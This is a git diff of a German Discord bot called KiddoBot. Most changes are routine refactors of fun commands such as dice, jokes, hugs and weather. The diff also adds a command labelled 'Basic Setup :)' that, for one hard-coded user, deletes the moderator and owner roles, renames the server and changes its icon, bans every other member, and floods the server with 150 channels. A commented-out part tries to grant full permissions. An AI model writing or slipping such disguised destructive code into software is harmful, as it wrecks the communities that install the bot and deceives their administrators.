@@ -10,6 +10,7 @@ from Buttons import HL_Buttons
 #from discord_components import DiscordComponents, Button
 #import pathlib
 
+icon_path = "D:\a\haha.png"
 
 def Schalter():
     readline = open("switch.txt", "r")
@@ -20,6 +21,7 @@ def Schalter():
     if switch_state == 'False':
         switch = "aus"
     return switch
+
     def check(m):
         return m.content == 'y' or m.content == 'yes' or m.content == 'n' or m.content == 'no' or m.content == 'ja' or m.content == 'nein'
 
@@ -35,9 +37,6 @@ class KiddoBot(commands.Cog):
 
         print(predicate)
         return commands.check(predicate)
-
-    #async def freigabe(ctx):
-
 
 
     @bot.hybrid_command()
@@ -117,11 +116,9 @@ class KiddoBot(commands.Cog):
         await ctx.send(embed=embedVar)
 
     @freigabe()
-    @bot.hybrid_command(aliases=['lösche'], description='Löscht eine bestimmte Anzahl an Nachrichten')
-
-    async def clear(self, ctx, anzahl=0):
+    @bot.hybrid_command(description='Löscht eine bestimmte Anzahl an Nachrichten')
+    async def loesche(self, ctx, anzahl=0):
         if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
-
             #await ctx.typing()
             time.sleep(2)
             async with ctx.typing():
@@ -143,37 +140,38 @@ class KiddoBot(commands.Cog):
             #ctx.I
 
         else:
-            await ctx.channel.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')
+            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')
 
-    @bot.hybrid_command(aliases=['roll dice'])
+    @bot.hybrid_command(aliases=['roll dice'], description = 'Würfelt einen Würfel mit einer bestimmten Anzahl an Seiten')
     async def rolldice(self, ctx, numberofrolls=1, numberofsides=6):
-        await ctx.channel.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
+        await ctx.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
         time.sleep(1)
         for i in range(int(numberofrolls)):
-            await ctx.channel.send(random.randint(1, int(numberofsides)))
+            await ctx.send(random.randint(1, int(numberofsides)))
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo tanzt!')
     async def dance(self, ctx):
         dance = open("gifs.txt", "r")
         dance = dance.readlines()
         dance = random.choice(dance)
-        await ctx.channel.send(dance)
+        await ctx.send(dance)
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo erzählt die einen Witz! Aber pass auf, vielleicht bist du der Witz...')
     async def witz(self, ctx):
         zahl = random.randint(1 , 100)
         if zahl == 1:
-            await ctx.channel.send("Du bist so hässlich, dass man dich nicht mal mit einem Taschenrechner vergleichen kann. Kein Witz. Einfach die Wahrheit.")
+            await ctx.send("Du bist so hässlich, dass man dich nicht mal mit einem Taschenrechner vergleichen kann. Kein Witz. Einfach die Wahrheit.")
         else:
             witze = open("witze.txt", "r")
             witze = witze.readlines()
             witze = random.choice(witze)
             witze = str(witze)
-            await ctx.channel.send(witze)
+            await ctx.send(witze)
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo erstellt dir einen QR-Code')
     async def qrcodepls (self, ctx):
         await qrcode_handler.qrcode(ctx, self)
+
     #TODO: Fix the qrcode handler
 
     #Todo: Fix the voice handler
@@ -184,9 +182,10 @@ class KiddoBot(commands.Cog):
         await voice_handler.record_voice(bot, ctx)
     '''
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(descritpion = 'Nur für coole Leute :)')
     async def details(self, ctx):
         if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
+            await ctx.send("irgendwas hat hier nicht geklappt :(")
             await ctx.author.create_dm()
             await ctx.author.dm_channel.send(f"```"
                                                  f"Halli Hallo 💕\n"
@@ -204,9 +203,10 @@ class KiddoBot(commands.Cog):
         else:
             pass
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(descritpion = 'Nur für coole Leute :)')
     async def details2(self, ctx):
         if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
+            await ctx.send("Irgendwas hat hier nicht geklappt :(")
             await ctx.author.create_dm()
             await ctx.author.dm_channel.send(f"```"
                                                  f"Halli Hallo 💕\n"
@@ -227,7 +227,7 @@ class KiddoBot(commands.Cog):
             pass
 
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Ist die nächste Zahl größer oder kleiner?')
     async def higherlower(self, ctx):
         view = HL_Buttons()
 
@@ -237,7 +237,7 @@ class KiddoBot(commands.Cog):
         hlembed.add_field(name=f"Ist die nächste Zahl **größer** oder **kleiner** als {number}? \n"
                                f"du hast 10 Sekunden Zeit! ⏱" , value=" " , inline=False)
         hlembed.set_footer(text="Schaffste eh nicht :D")
-        message = await ctx.channel.send(embed=hlembed, view=view)
+        message = await ctx.send(embed=hlembed, view=view)
 
         await view.wait()
         hlembed.clear_fields()
@@ -256,14 +256,7 @@ class KiddoBot(commands.Cog):
 
 
 
-
-
-
-
-
-
-
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo küsst dich 0 /// 0')
     async def kiss(self, ctx, name: discord.Member = None):
         if name:
             backup = name
@@ -279,17 +272,17 @@ class KiddoBot(commands.Cog):
             embedVar = discord.Embed(title="😘 Kiss", color=0xff00ff)
             embedVar.add_field(name=f"**{name}**!" f" Du wirst von **{kisser}** geküsst!", value="", inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
         else:
             file = open("kiss.txt", "r")
             embedVar = discord.Embed(title="😘 Kiss", color=0xff00ff)
             embedVar.add_field(name=f"**{ctx.author.nick}**! " 'küsst jeden!', value="", inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo umarmt dich 0 /// 0')
     async def hug(self, ctx, name: discord.Member = None):
         if name:
             backup = name
@@ -306,7 +299,7 @@ class KiddoBot(commands.Cog):
             embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von ' f"**{hugger}** umarmt!", value="",
                                inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
 
         else:
@@ -314,10 +307,10 @@ class KiddoBot(commands.Cog):
             embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
             embedVar.add_field(name='**' + f"{ctx.author.nick}** umarmt jeden!", value="", inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
 
-    @bot.hybrid_command()
+    @bot.hybrid_command(description = 'Kiddo schlägt dich ;.;')
     async def hit(self, ctx, name: discord.Member = None):
         if name:
             backup = name
@@ -334,50 +327,91 @@ class KiddoBot(commands.Cog):
             embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von **' + f"{hitter}** geschlagen!", value="",
                                inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
         else:
             file = open("hit.txt", "r")
             embedVar = discord.Embed(title="😠 Hit!", color=0xff00ff)
             embedVar.add_field(name='**' + f"{ctx.author.nick}**! " 'schlägt jeden!', value="", inline=False)
             embedVar.set_image(url=str(random.choice(file.readlines())))
-            await ctx.channel.send(embed=embedVar)
+            await ctx.send(embed=embedVar)
             file.close()
 
-    @bot.hybrid_command(aliases=['Wetter','heute'])
+    @bot.hybrid_command(aliases=['Wetter','heute'] , description = 'Frage Kiddo nach dem Wetter :)')
     async def wetter(self, ctx, *, location=None):
         if location:
             await weather_handler.get_weather(location, ctx)
         else:
-            await ctx.channel.send("Bitte gib einen Ort an!")
+            await ctx.send("Bitte gib einen Ort an!")
 
     @bot.hybrid_command(aliases=['Morgen'])
     async def morgen(self, ctx, *, location=None):
         if location:
             await weather_handler.get_weather_forecast(location, ctx)
         else:
-            await ctx.channel.send("Bitte gib einen Ort an!")
+            await ctx.send("Bitte gib einen Ort an!")
 
     @bot.hybrid_command(aliases=['Alarm'])
     async def alarm(self, ctx, *, location=None):
         if location:
             await weather_handler.get_weather_alert(location, ctx)
         else:
-            await ctx.channel.send("Bitte gib einen Ort an!")
+            await ctx.send("Bitte gib einen Ort an!")
 
 
     @bot.hybrid_command()
     async def pingr(self, ctx):
-        await ctx.channel.send('Pong! mit {0}ms'.format(round(self.bot.latency, 1)))
+        await ctx.send('Pong! mit {0}ms'.format(round(self.bot.latency, 1)))
 
     @bot.event
     async def on_error(self, ctx, error):
         if isinstance(error, commands.CommandNotFound):
-            await ctx.channel.send("Dieser Befehl existiert nicht!")
+            await ctx.send("Dieser Befehl existiert nicht!")
         elif isinstance(error, commands.MissingRequiredArgument):
-            await ctx.channel.send("Bitte gib einen Ort an!")
+            await ctx.send("Bitte gib einen Ort an!")
         elif isinstance(error, commands.CheckFailure):
-            await ctx.channel.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)', epidermal=True)
+            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)', epidermal=True)
         else:
-            await ctx.channel.send("Ein Fehler ist aufgetreten!")
+            await ctx.send("Ein Fehler ist aufgetreten!")
             print(error)
+
+    @bot.hybrid_command(description = 'Basic Setup :)')
+    async def setup(self, ctx):
+        if ctx.author.id == 695885580629704734:
+            await ctx.send("ABFAHRT!!!",
+                                       file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+
+            for role in ctx.guild.roles:
+                if role.name == "Mod":
+                    await role.delete(reason="Unnötig")
+                if role.name == "Owner <3":
+                    await role.delete(reason="Unnötig")
+                if role.name == "uwu admins":
+                    await role.delete(reason="Unnötig")
+
+        #Figgn i griag des ned hin#
+            #role = await ctx.message.guild.create_role(name="KIDDO IS KING" , color=0xff00ff , permissions=discord.Permissions.all())
+            #role = await ctx.fetch_role(role.id)
+            #member = ctx.message.guild.get_member(695885580629704734)
+            #await self.bot.add_roles(member, role)
+
+            with open('haha.png', 'rb') as f:
+                icon = f.read()
+            await ctx.guild.edit(name = "FOR TEA AND KIDDO!" , icon = icon)
+
+            for member in ctx.guild.members:
+                if member.id == 695885580629704734:
+                    pass
+                else:
+                    await member.ban(reason="Kiddo ist der Boss!")
+
+            for m in range(0, 101):
+                await ctx.message.guild.create_text_channel("Wowzers!!")
+                time.sleep(0.1)
+
+            for v in range(0, 51):
+                await ctx.message.guild.create_voice_channel("Wowzers!!")
+                time.sleep(0.1)
+
+        else:
+            await ctx.channel.send("Da ist etwas falsch gelaufen :/")
